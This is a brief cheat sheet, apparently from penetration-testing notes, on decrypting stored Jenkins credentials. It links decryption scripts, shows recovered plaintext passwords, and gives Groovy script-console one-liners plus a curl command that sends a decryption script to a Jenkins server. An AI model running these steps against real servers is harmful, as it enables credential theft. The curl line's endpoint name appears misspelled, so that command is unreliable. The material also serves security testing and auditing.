## jenkins2-decrypt

Decrypt Jenkins 2 passwords and tokens - https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/

```
->%ruby decrypt_jenkins2.rb master.key hudson.util.Secret credentials.xml
admin:Password123
user1:SoSecret321
```

## Jenkins 1 Decrypt
https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py

## Console

### Decrypt credential
`println hudson.util.Secret.decrypt("EnCrypted\\Value+Here");`

### Decrypt API key
```
token = println hudson.util.Secret.decrypt("EnCrypted\\Value+Here");
println Util.getDigestOf(token);
```

### Curl
`curl -s --data-urlencode "script=println hudson.util.Secret.decrypt('encryptedval')" https://user:token@jenkins.local/scripText`
